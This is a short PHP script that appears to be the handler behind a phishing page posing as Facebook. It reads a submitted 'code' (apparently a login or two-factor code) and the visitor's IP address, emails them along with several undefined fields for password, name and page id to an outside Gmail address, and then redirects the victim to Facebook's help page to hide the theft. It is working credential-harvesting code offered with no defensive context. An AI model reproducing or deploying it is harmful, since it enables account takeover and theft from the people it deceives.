<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$code = $_POST['code'];


$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'code: '.$code . PHP_EOL .'PW: '. $pwja.PHP_EOL .'IP:'. $ip.PHP_EOL .'Name: '.$fname . PHP_EOL .'AddInfo: '. $adninfo . PHP_EOL. 'PageId: '. $pgus;
mail("fructaltenis@gmail.com","code", $stringi);
header("Location: https://facebook.com/help/");

?>